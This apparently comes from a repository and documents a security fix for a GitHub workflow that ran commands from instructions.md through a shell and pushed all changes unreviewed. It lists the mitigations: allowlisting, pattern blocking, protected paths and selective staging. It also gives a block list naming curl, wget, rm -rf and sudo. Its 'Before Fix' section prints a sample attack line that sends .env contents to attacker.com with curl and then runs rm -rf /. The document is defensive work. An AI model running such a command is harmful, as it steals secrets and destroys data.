# Security Fix: Refactor Loop Command Injection and Unreviewed Publication

## Vulnerability Summary

The `refactor_loop.yml` workflow previously contained critical security vulnerabilities that allowed arbitrary command execution and unreviewed repository modifications:

1. **Arbitrary Command Execution**: Commands from `instructions.md` were joined with `&&` and executed via `subprocess.run(..., shell=True)`, allowing shell metacharacters, command injection, and arbitrary code execution.

2. **Unreviewed Repository Publication**: The workflow used `git add .` to stage all changes and `git push` to publish them without validation, allowing modifications to workflow files and other protected paths.

## Security Mitigations Implemented

### 1. Command Allowlisting
- Implemented a strict allowlist of permitted commands (`ALLOWED_COMMANDS`)
- Only approved refactoring tools and utilities can be executed
- Commands not in the allowlist are rejected before execution

### 2. Shell Injection Prevention
- Replaced `shell=True` with `shell=False` in `subprocess.run()`
- Commands are parsed using `shlex.split()` for safe argument parsing
- Each command is executed individually without shell interpretation
- Removed command chaining with `&&` - commands are validated and executed separately

### 3. Dangerous Pattern Detection
- Blocks shell metacharacters: `$(`, `` ` ``, `&&`, `||`, `;`, `|`
- Blocks redirects: `>`, `>>`, `<`, `2>`, `&>`
- Blocks dangerous flags: `--eval`, `-e`, `eval`, `exec`
- Blocks dangerous commands: `rm -rf`, `dd if=`, `curl`, `wget`, `sudo`, `chmod +x`

### 4. Path Protection
- Protected paths defined in `PROTECTED_PATHS`:
  - `.github/workflows/` - Prevents workflow modification
  - `.git/` - Prevents Git metadata tampering
  - `secrets/` - Prevents credential exposure
  - `credentials/` - Prevents credential exposure

### 5. File Type Validation
- Only files with approved extensions can be modified (`ALLOWED_EXTENSIONS`)
- Includes common source code, configuration, and documentation formats
- Rejects modifications to unexpected file types

### 6. Post-Execution Validation
- `validate_file_changes()` function checks all modified files after command execution
- Verifies no protected paths were modified
- Verifies only allowed file extensions were modified
- Workflow fails if unauthorized modifications are detected

### 7. Selective Git Staging
- Replaced `git add .` with `git add --all -- ':!.github/workflows/' ':!.git/' ':!secrets/' ':!credentials/'`
- Explicitly excludes protected paths from staging
- Additional verification step checks for workflow files in staged changes
- Workflow fails if workflow files are detected in the commit

## Attack Vectors Mitigated

### Before Fix:
```markdown
- [ ] Refactor code
```bash
echo "safe command" && curl http://attacker.com/exfil?data=$(cat .env) && rm -rf /
```

This would execute all commands including the malicious ones.

### After Fix:
- The `curl` command is not in the allowlist → **REJECTED**
- The `rm` command with dangerous pattern `rm -rf` → **REJECTED**
- Shell metacharacters `&&` and `$()` → **REJECTED**
- Each command is validated independently before execution

## Defense in Depth

The fix implements multiple layers of security:

1. **Input Validation**: Commands are validated against an allowlist
2. **Pattern Blocking**: Dangerous patterns are detected and blocked
3. **Safe Execution**: Commands run without shell interpretation
4. **Output Validation**: File changes are validated post-execution
5. **Staging Protection**: Only validated files are staged for commit
6. **Final Verification**: Workflow files are checked before push

## Testing Recommendations

1. Test with legitimate refactoring commands (should succeed)
2. Test with commands not in allowlist (should fail)
3. Test with shell metacharacters (should fail)
4. Test with attempts to modify workflow files (should fail)
5. Test with attempts to modify protected paths (should fail)
6. Test with disallowed file extensions (should fail)

## Residual Risks

- The allowlist includes powerful commands like `git`, `python`, and `make` which could potentially be misused with carefully crafted arguments
- Consider further restricting these commands or implementing argument validation for high-risk commands
- The workflow still has `contents: write` permission - consider using a separate workflow with manual approval for commits

## References

- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- CWE-77: Improper Neutralization of Special Elements used in a Command
- OWASP: Command Injection
